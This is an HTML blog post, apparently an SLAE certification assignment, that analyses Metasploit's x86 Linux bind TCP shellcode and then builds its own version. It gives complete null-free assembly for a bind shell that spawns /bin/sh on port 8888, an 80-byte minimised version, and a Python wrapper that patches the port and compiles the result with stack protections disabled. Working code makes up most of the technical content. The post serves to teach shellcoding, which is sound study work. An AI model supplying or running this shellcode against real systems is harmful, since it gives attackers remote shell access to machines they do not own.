@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+    content="Nipun Jaswal">
+<meta name="description"
+    content="Dear Readers, we all in the infosec community use bind TCP shell almost on a daily basis. I too have seen many people copying shellcodes blindly from the internet and just pasting them into the exploits without knowing what those shellcodes might be carrying.
+
+Today, we will uncover the working of bind TCP shell and based on the analysis, we will try to develop one ourselves. If you are not familiar with the assembly, Enroll yourself into SLAE course from SecurityTube, its one of the best classes available out there and i am able to write this post based on the advanced knowledge i gained from the course itself." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/2018/01/art-of-shellcoding-the-saga-of-bind-tcp-shell/" />
+
+
+<title>
+    
+    Art of Shellcoding: The Saga of Bind TCP Shell :: VAPT.IO - Home of the Next Gen Cyber Ninja  — Learn Vulnerability Assessment and Penetration Testing
+    
+</title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.7bfbbe12786fa0ded4b4c0d792cbb36a5bd0bdb0b856dde57aa7b1f6fe0f2b87.css">
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
+<link rel="shortcut icon" href="/favicon.ico">
+<meta name="theme-color" content="#252627"><meta itemprop="name" content="Art of Shellcoding: The Saga of Bind TCP Shell">
+<meta itemprop="description" content="Dear Readers, we all in the infosec community use bind TCP shell almost on a daily basis. I too have seen many people copying shellcodes blindly from the internet and just pasting them into the exploits without knowing what those shellcodes might be carrying.
+
+Today, we will uncover the working of bind TCP shell and based on the analysis, we will try to develop one ourselves. If you are not familiar with the assembly, Enroll yourself into SLAE course from SecurityTube, its one of the best classes available out there and i am able to write this post based on the advanced knowledge i gained from the course itself.">
+
+
+<meta itemprop="datePublished" content="2018-01-02T14:24:00&#43;05:30" />
+<meta itemprop="dateModified" content="2018-01-02T14:24:00&#43;05:30" />
+<meta itemprop="wordCount" content="1701">
+
+
+
+<meta itemprop="keywords" content="slae,slae assignment 1," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/"/>
+
+<meta name="twitter:title" content="Art of Shellcoding: The Saga of Bind TCP Shell"/>
+<meta name="twitter:description" content="Dear Readers, we all in the infosec community use bind TCP shell almost on a daily basis. I too have seen many people copying shellcodes blindly from the internet and just pasting them into the exploits without knowing what those shellcodes might be carrying.
+
+Today, we will uncover the working of bind TCP shell and based on the analysis, we will try to develop one ourselves. If you are not familiar with the assembly, Enroll yourself into SLAE course from SecurityTube, its one of the best classes available out there and i am able to write this post based on the advanced knowledge i gained from the course itself."/>
+
+
+
+
+<meta property="article:published_time" content="2018-01-02 14:24:00 &#43;0530 IST" />
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">ap3x@vapt.io:~# ./hack</span>
+            <span class="logo__cursor"></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>8 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title"><a href="/posts/2018/01/art-of-shellcoding-the-saga-of-bind-tcp-shell/">Art of Shellcoding: The Saga of Bind TCP Shell</a></h1>
+
+            
+
+            <div class="post-content">
+                <p>Dear Readers, we all in the infosec community use bind TCP shell almost
+on a daily basis. I too have seen many people copying shellcodes blindly
+from the internet and just pasting them into the exploits without
+knowing what those shellcodes might be carrying.</p>
+
+<p><a href="../images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-shell.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-shell.png" alt="" /></a></p>
+
+<p>Today, we will uncover
+the working of bind TCP shell and based on the analysis, we will try to
+develop one ourselves. If you are not familiar with the assembly, Enroll
+yourself into SLAE course from
+<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">SecurityTube</a>,
+its one of the best classes available out there and i am able to write
+this post based on the advanced knowledge i gained from the course
+itself. Anyways, The agenda of this exercise is to:</p>
+
+<ul>
+<li>Analyze the Bind Shell generated from Metasploit</li>
+<li>Create your own shellcode based on the analysis</li>
+<li>Remove any Null bytes (Bad Characters)</li>
+<li>Generate a space friendly shellcode (minimalistic)</li>
+<li>Write a wrapper to dynamically change the bind port</li>
+</ul>
+
+<p>So let&rsquo;s get started, we will use <strong>libemu</strong> to analyze the
+<strong>bind_shell_tcp</strong> shellcode for x86 Linux. The analytics for this
+shellcode can be drawn through the following command:</p>
+
+<pre><code>msfvenom -p linux/x86/shell\_bind\_tcp LPORT=4444 -f raw | sctest -vvv -Ss 10000
+</code></pre>
+
+<p>Creating a graphical representation of the shellcode using libemu, we
+have the following flow diagram of the bind_shell_tcp payload as shown
+in the next screen:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-linux-shell-bind-tcp-x86.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-linux-shell-bind-tcp-x86.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Analysis of the BIND TCP Shellcode generated using msfvenom</td>
+</tr>
+</tbody>
+</table>
+
+<p>We can see that we have a pretty straightforward workflow which displays
+all the important system calls used by the bind_shell_tcp shellcode.
+However, let us try tracing all the system calls, parameters involved,
+etc. using <strong>strace</strong> as shown on the following screen:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-calls.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-calls.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Strace Analysis on the shellcode</td>
+</tr>
+</tbody>
+</table>
+
+<p>We can clearly see the order and parameters passed to the system calls.
+Let&rsquo;s use this information as a base for our shellcode and jump directly
+into building a shellcode from the very scratch:</p>
+
+<pre><code> xor ebx,ebx     ; Clearing EBX Register
+ xor eax,eax     ; Clearing EAX Register
+ mov al,102      ; Moving SocketCall to EAX(Sys Call Number= 102)
+ inc bl          ; (Saving 1 Byte) Moving 1 to EBX with a Byte Less,
+ otherwise w$
+ push esi        ; Pushing 0 onto the stack(0: IPPROTO_IP)
+ push byte 1     ; Pushing 1 onto the stack(1: SOCK_STREAM)
+ push byte 2     ; Pushing 2 onto the stack(2: AF_INET)
+ mov ecx,esp     ; Load pointer to the stack structure to ECX
+ int 0x80        ; Calling Interrupt
+</code></pre>
+
+<p>What did we do? Initially, we cleared both <code>EAX</code> and <code>EBX</code> registers and moved the socketcall identifier (<code>102 | 0x66</code>) to <code>EAX</code>(AL),  We could have
+moved 1 to <code>BL</code>. Instead, we used <code>INC</code>(Increment) instruction which makes
+the value inside <code>BL</code> as 1. We pushed <code>0</code>  to the stack which is the value
+for <code>IPPROTO_IP</code>. Similarly, we pushed <code>1</code> and <code>2</code> onto the stack which is
+nothing but <code>SOCK_STREAM</code> and <code>PF_INET</code>. This makes stack contain {2,1,0}.
+  We have already set <code>EAX</code> and <code>EBX</code>, we need to set <code>ECX</code> to the stack. Hence,
+we move <code>ESP</code> to <code>ECX</code>. Next, we simply call the Interrupt. Looking at the
+socketcall:</p>
+
+<pre><code> int socketcall(int call, unsigned long **args);
+</code></pre>
+
+<ul>
+<li>The <strong>socketcall</strong> identifier is 102 &mdash;&gt; EAX</li>
+<li><strong>int call</strong> identifier is 1 &mdash;-&gt; 1: SYS_SOCKET &mdash;&gt; EBX</li>
+<li><strong>unsigned long *</strong><em>args</em> &mdash;-&gt;{2,1,0} &mdash;&gt; Address &mdash;&gt;
+ECX</li>
+</ul>
+
+<p>Setting up the <code>SYS_SOCKET</code>, next task is to setup bind system call,
+let&rsquo;s get started:</p>
+
+<pre><code> xchg edi,eax         ; Saving the Result After Syscall from EAX to EDI
+ push esi             ; Zero Pushed onto the Stack
+ push word 0xb822     ; Port 8888 Pushed onto the Stack
+ push word 2          ; 2 Pushed onto the Stack
+ mov ebx,esp          ; Top of the stack stored to EBX-&gt;{0xb8220002,0}
+ push byte 16         ; 16 Pushed onto the Stack
+ push ebx             ; Pointer --&gt; {Port,0}
+ push edi             ; EDI Points to Result from SocketCALL
+ xor ebx,ebx          ; Clearing EBX
+ mul ebx              ; Clearing EAX
+ mov al,102           ; SOCKETCALL Identifier
+ mov bl,2             ; int call is bind here; 2
+ mov ecx,esp          ; Address of the top of the stack to ECX
+ int 0x80             ; Interrupt
+
+</code></pre>
+
+<p> </p>
+
+<pre><code>int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+</code></pre>
+
+<p>We store the result from the previous call to EDI from EAX which is
+nothing but the value to be placed in <strong>sockfd</strong>. We push 0 onto the
+stack with <code>PUSH ESI</code> and then <code>PUSH 0xb8220002</code> onto the stack. We did this
+in two steps using push word instruction because pushing it in one go
+would have resulted in a NULL byte generated by leading two zeros of the
+<code>0002</code>. So, now our stack becomes {b8220002, 00000000}. We store the
+address of current <code>ESP</code> to <code>EBX</code>. Next, we push <code>16</code> which is <strong>socklen_t</strong>,
+we push EBX as <strong>sockaddr</strong>, and we push <strong>sockfd</strong> stored in <code>EDI</code>.</p>
+
+<p>We now have the complete structure of arguments present on the stack,
+and since everything is placed correctly on the stack, we can clear the
+<code>EBX</code> and <code>EAX</code> registers. Let&rsquo;s issue another <code>SOCKETCALL</code> with call type as
+<code>SYS_BIND</code> denoted by 2 as the identifier. So, we move <code>102</code> to <code>EAX</code>, <code>2</code> to
+<code>EBX</code> and Top of the stack which contains our parameter structure to <code>ECX</code>
+and issues the interrupt. The Next call is to <code>listen</code>. Let &rsquo;s see what
+parameters are required for this call to work:</p>
+
+<pre><code>int listen(int sockfd, int backlog);
+</code></pre>
+
+<pre><code> push esi               ; Backlog Value 0
+ push edi               ; Pushing Sockfd onto the stack
+ xor ebx,ebx            ; Clearing EBX
+ mul ebx                ; Clearing EAX
+ mov al,102             ; SOCKETCALL
+ mov bl,4               ; Listen call
+ mov ecx,esp            ; Pointing pushed values to ECX
+ int 0x80               ; Interrupt
+</code></pre>
+
+<p>We know we have our sockfd in the <code>EDI</code> let&rsquo;s push it to the stack after
+pushing 0 for the backlog by issuing <code>PUSH ESI</code>. Next, we just clear off
+<code>EAX</code> and <code>EBX</code> registers and build registers to issue another <code>SOCKETCALL</code>.
+But this time, we move 4 to EBX which denotes SYS_Listen call, we move
+the top of the stack to ECX and simply issue the interrupt. Next, we
+move to the accept call as follows:</p>
+
+<pre><code>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+</code></pre>
+
+<p>We will similarly setup this system call like the way we did for the
+earlier ones:</p>
+
+<pre><code> xor ebx,ebx    ; Clearing EBX
+ mul ebx          ; Clearing EAX
+ push esi          ; 0
+ push esi          ; 0
+ push edi          ; Sockfd
+ mov al,102     ; Socketcall
+ mov bl,5         ; accept
+ mov ecx,esp   ; moving pointer to {sockfd,0,0} to ECX
+ int 0x80          ; Generating interrupt
+</code></pre>
+
+<p>Pretty straightforward! We are putting the value 0 for <code>sockadd*</code> and
+<code>socklen_t</code> while having the sockfd pushed through EDI. We just set up
+this call using 5(accept) in EBX. The final segment of the code contains
+two crucial system calls which are dup2 and execve. Let&rsquo;s see the code
+fragment:</p>
+
+<blockquote>
+<p><span class="pl-k">xchg</span><span class="pl-en"> </span><span
+class="pl-v">ebx</span><span class="pl-s1">,</span><span
+class="pl-v">eax</span><span class="pl-c"> ; </span></p>
+</blockquote>
+
+<p><span class="pl-k">xor</span><span class="pl-en"> </span><span
+class="pl-v">ecx</span><span class="pl-s1">,</span><span
+class="pl-v">ecx</span><span class="pl-c"> ; Clearing ECX</span></p>
+
+<p><span class="pl-k">mov</span><span class="pl-en"> </span><span
+class="pl-v">cl</span><span class="pl-s1">,</span><span
+class="pl-c1">2</span><span class="pl-c"> ; Moving 2 to ECX</span></p>
+
+<p><span class="pl-k">loop</span><span class="pl-en">: </span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">mov</span><span
+class="pl-en"> </span><span class="pl-v">al</span><span
+class="pl-s1">,</span><span class="pl-c1">63</span><span class="pl-c"> ;
+Calling DUP2</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">int</span><span
+class="pl-en"> </span><span class="pl-c1">0x80</span><span class="pl-c">
+; Calling Interrupt</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">dec</span><span
+class="pl-en"> </span><span class="pl-v">ecx</span><span class="pl-c"> ;
+Dec ECX</span></p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td><span class="pl-en"> jns </span><span class="pl-k">loop</span><span class="pl-c"> ; Jump to loop till SF not set </span></td>
+</tr>
+<tr class="even">
+<td></td>
+</tr>
+</tbody>
+</table>
+
+<p><span class="pl-en">done:</span></p>
+
+<p><span class="pl-c"> ;EXECVE</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">xor</span><span
+class="pl-en"> </span><span class="pl-v">eax</span><span
+class="pl-s1">,</span><span class="pl-v">eax</span><span class="pl-en">
+</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">push</span><span
+class="pl-en"> </span><span class="pl-v">eax</span><span class="pl-c"> ;
+0</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">push</span><span
+class="pl-en"> </span><span class="pl-c1">0x68732f2f</span><span
+class="pl-c"> ; //sh</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">push</span><span
+class="pl-en"> </span><span class="pl-c1">0x6e69622f</span><span
+class="pl-c"> ; /bin</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">mov</span><span
+class="pl-en"> </span><span class="pl-v">ebx</span><span
+class="pl-s1">,</span><span class="pl-v">esp</span><span class="pl-c"> ;
+Pointer to Structures in Stack(Top)</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">mov</span><span
+class="pl-en"> </span><span class="pl-v">ecx</span><span
+class="pl-s1">,</span><span class="pl-v">eax</span><span class="pl-c"> ;
+0 to ECX</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">mov</span><span
+class="pl-en"> </span><span class="pl-v">edx</span><span
+class="pl-s1">,</span><span class="pl-v">eax</span><span class="pl-c"> ;
+0 to EDX</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">mov</span><span
+class="pl-en"> </span><span class="pl-v">al</span><span
+class="pl-s1">,</span><span class="pl-c1">11</span><span class="pl-c"> ;
+EXECVE CALL</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">int</span><span
+class="pl-en"> </span><span class="pl-c1">0x80</span><span class="pl-c">
+; Interrupt</span></p>
+
+<p>We simply exchange the result to EBX from EAX which held the result from
+the last system call. Next, we cleared ECX and moved value 2 into it. We
+did this because of  3 distinct values of descriptors for which we will
+call dup2. Next, we issue dup2 call denoted by 63 in a loop till ECX
+becomes 0 and Finally, we push null terminated /bin//sh and point it to
+EBX:</p>
+
+<p><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B15.57.48.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B15.57.48.png" alt="" /></a></p>
+
+<p>Next, we clear out ECX and EDX using 0 from EAX. We move call number
+11(EXECVE) to EAX and issue the interrupt. Let&rsquo;s extract the shellcode
+from the program as follows:</p>
+
+<p><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B16.05.03.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B16.05.03.png" alt="" /></a></p>
+
+<p>Compiling the C program and running the shellcode, we can see that it
+works flawlessly:</p>
+
+<p><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B16.17.24.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B16.17.24.png" alt="" /></a></p>
+
+<p>Everything works flawlessly here. <span
+style="background-color: yellow;"><strong>The final version of the code can be
+obtained at: </strong></span>
+<a href="https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-1" target="_blank">https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-1</a></p>
+
+<p>We have a NULL free shellcode. However, the length of the shellcode is
+something which bothers me. A valid shellcode should be as small as
+possible, and 108 bytes just doesn&rsquo;t seem to fit in that definition. I
+have tweaked the code to make it smaller <span style="color: red;"><strong>(80
+Bytes)</strong></span> using the following set of techniques:</p>
+
+<ul>
+<li>Register Re-Use</li>
+<li>Making use of PUSH - POP Instructions</li>
+<li>Using Single Byte Instructions</li>
+<li>XCGG Instructions and many more</li>
+</ul>
+
+<p>The final minimalistic shellcode is as follows:</p>
+
+<blockquote>
+<pre><code> 
+
+global _start
+
+section .text
+
+_start:
+
+; SYS_SOCKET
+push 0x66
+pop eax
+cdq
+push ebx
+inc ebx
+push ebx
+push 0x2
+mov ecx,esp
+int 0x80
+
+; SYS_BIND
+pop ebx
+pop esi
+push edx
+push word 0xb822
+push edx
+push byte 0x02
+push 0x10
+push ecx
+push eax
+mov ecx,esp
+mov al,0x66
+int 0x80
+
+; SYS_LISTEN
+pop edx
+pop eax
+xor eax,eax
+push eax
+push edx
+cdq
+mov bl,0x4
+mov al,0x66
+int 0x80
+
+; SYS_ACCEPT
+inc ebx
+mov al,0x66
+int 0x80
+
+; DUP2
+xchg eax, ebx
+pop ecx
+loop:
+ mov al,63
+ int 0x80
+ dec ecx
+ jns loop
+done:
+ push eax
+ push 0x68732f2f
+ push 0x6e69622f
+ mov ebx,esp
+ push eax
+ mov ecx,esp
+ mov al,0xb ; EXECVE CALL
+ int 0x80
+</code></pre>
+</blockquote>
+
+<p> Additionally, since we know that the port 8888 is denoted in the
+shellcode using <strong>&ldquo;\x22\xb8&rdquo;</strong> bytes, we can simply build a generator
+script in python which will replace these bytes with the bytes of some
+other port and make the shellcode to change the port on the fly:</p>
+
+<blockquote>
+<p><span class="pl-c"><span class="pl-c">#</span>!/usr/bin/python</span></p>
+</blockquote>
+
+<p><span class="pl-k">import</span> sys</p>
+
+<p><span class="pl-c1">print</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span>Stub File:<span
+class="pl-pds">&ldquo;</span></span><span class="pl-k">+</span>sys.argv[<span
+class="pl-c1">1</span>]</p>
+
+<p><span class="pl-c1">print</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span>Port Used:<span
+class="pl-pds">&ldquo;</span></span><span class="pl-k">+</span>sys.argv[<span
+class="pl-c1">2</span>]</p>
+
+<p><span class="pl-k">with</span> <span
+class="pl-c1">open</span>(sys.argv[<span class="pl-c1">1</span>]<span
+class="pl-k">+</span><span class="pl-s"><span
+class="pl-pds">&ldquo;</span>.c<span class="pl-pds">&ldquo;</span></span>, <span
+class="pl-s"><span class="pl-pds">&ldquo;</span>rb<span
+class="pl-pds">&ldquo;</span></span>) <span class="pl-k">as</span> f:</p>
+
+<p>contents <span class="pl-k">=</span> f.readlines()</p>
+
+<p>port <span class="pl-k">=</span> <span class="pl-c1">hex</span>(<span
+class="pl-c1">int</span>(sys.argv[<span
+class="pl-c1">2</span>])).split(<span class="pl-s"><span
+class="pl-pds">&lsquo;</span>x<span class="pl-pds">&lsquo;</span></span>)[<span
+class="pl-c1">1</span>]</p>
+
+<p>fh, sh <span class="pl-k">=</span> port[:<span
+class="pl-c1">2</span>],port[<span class="pl-c1">2</span>:]</p>
+
+<p><span class="pl-k">if</span> <span class="pl-c1">len</span>(fh) <span
+class="pl-k">==</span> <span class="pl-c1">1</span>: fh <span
+class="pl-k">=</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span>0<span class="pl-pds">&ldquo;</span></span> <span
+class="pl-k">+</span> fh</p>
+
+<p><span class="pl-k">if</span> <span class="pl-c1">len</span>(sh) <span
+class="pl-k">==</span> <span class="pl-c1">1</span>: sh <span
+class="pl-k">=</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span>0<span class="pl-pds">&ldquo;</span></span> <span
+class="pl-k">+</span> sh</p>
+
+<p>_p <span class="pl-k">=</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span><span class="pl-cce">\\</span>x<span
+class="pl-c1">{0}</span><span class="pl-cce">\\</span>x<span
+class="pl-c1">{1}</span><span
+class="pl-pds">&ldquo;</span></span>.format(fh,sh)</p>
+
+<p><span class="pl-k">for</span> j,i <span class="pl-k">in</span> <span
+class="pl-c1">enumerate</span>(contents):</p>
+
+<p><span class="pl-k">if</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span><span class="pl-cce">\\</span>x22<span
+class="pl-cce">\\</span>xb8<span class="pl-pds">&ldquo;</span></span> <span
+class="pl-k">in</span> i:</p>
+
+<p><span class="pl-c1">print</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span>Line Number :<span class="pl-pds">&ldquo;</span></span>
+<span class="pl-k">+</span> <span class="pl-c1">str</span>(j)</p>
+
+<p>contents[j] <span class="pl-k">=</span> <span class="pl-s"><span
+class="pl-pds">&lsquo;</span>&ldquo;<span class="pl-pds">&lsquo;</span></span> <span
+class="pl-k">+</span> _p <span class="pl-k">+</span><span
+class="pl-s"><span class="pl-pds">&lsquo;</span>&ldquo;<span
+class="pl-pds">&lsquo;</span></span></p>
+
+<p>nf <span class="pl-k">=</span> sys.argv[<span
+class="pl-c1">1</span>]<span class="pl-k">+</span><span
+class="pl-s"><span class="pl-pds">&ldquo;</span>_new.c<span
+class="pl-pds">&ldquo;</span></span></p>
+
+<p><span class="pl-k">with</span> <span class="pl-c1">open</span>(nf, <span
+class="pl-s"><span class="pl-pds">&ldquo;</span>wb<span
+class="pl-pds">&ldquo;</span></span>) <span class="pl-k">as</span> f:</p>
+
+<p>f.writelines(contents)</p>
+
+<p><span class="pl-k">import</span> os</p>
+
+<p>os.system(<span class="pl-s"><span class="pl-pds">&ldquo;</span>gcc <span
+class="pl-c1">{0}</span> -o <span class="pl-c1">{1}</span>
+-fno-stack-protector -z execstack<span
+class="pl-pds">&ldquo;</span></span>.format(nf,sys.argv[<span
+class="pl-c1">1</span>]))</p>
+
+<p>os.system(<span class="pl-s"><span class="pl-pds">&ldquo;</span>rm <span
+class="pl-c1">{0}</span><span class="pl-pds">&ldquo;</span></span>.format(nf))</p>
+
+<p> We can run the generator as shown on the following screen:</p>
+
+<p><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-31%2B15.09.23.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-31%2B15.09.23.png" alt="" /></a></p>
+
+<p>Following are the links to all the codes used in the exercise:</p>
+
+<ol>
+<li> <a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-1/bind_shell_108.nasm" target="_blank">bind_shell_108.nasm : 108 bytes original null-free
+shellcode</a></li>
+<li> <a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-1/bind_shell_80.nasm" target="_blank">bind_shell_80.nasm   :  80 bytes null-free
+shellcode</a></li>
+<li><a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-1/shellcode108.c" target="_blank"> shellcode108.c           :  C file for 108 bytes bind TCP
+shellcode [Generator
+Format]</a></li>
+<li> <a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-1/shellcode80.c" target="_blank">shellcode80.c             :  C file for 80 bytes bind TCP
+shellcode [Generator
+Format]</a></li>
+<li><span
+class="css-truncate css-truncate-target"><a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-1/linux_bind_shell_generator.py" id="4bedaf2c99eabb3f9c15192b7585c691-5ce587f35458f0aa3ab60975cde933c972a8aa71" class="js-navigation-open" title="linux_bind_shell_generator.py">linux_bind_shell_generator.py : Port Wrapper for Shellcode</a></span></li>
+</ol>
+
+<p><span style="color: red;">This blog post has been created for completing
+the requirements of the SecurityTube Linux Assembly Expert
+certification:</span>
+<span style="color: red;"> </span><span
+style="color: red;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span>
+<span style="color: red;"> </span><span style="color: red;">Student-ID:
+SLAE-1080</span>
+<span class="css-truncate css-truncate-target"></span></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/slae">slae</a></span><span class="tag"><a href="/tags/slae-assignment-1">slae assignment 1</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1701 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2018-01-02 14:24 &#43;0530</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="/posts/2018/01/art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">Art of Shellcoding:  Tale of the Smallest Reverse TCP Shellcode</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="/posts/2017/11/postpone-your-marriage-plans-and-deal-with-the-hack-first/">
+                                <span class="button__text">Postpone your Marriage plans and Deal with the Hack first</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2019</span>
+            
+                <span><a href="/">Apex Predator</a></span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+
+        </div>
+    </div>
+    <div class="footer__inner">
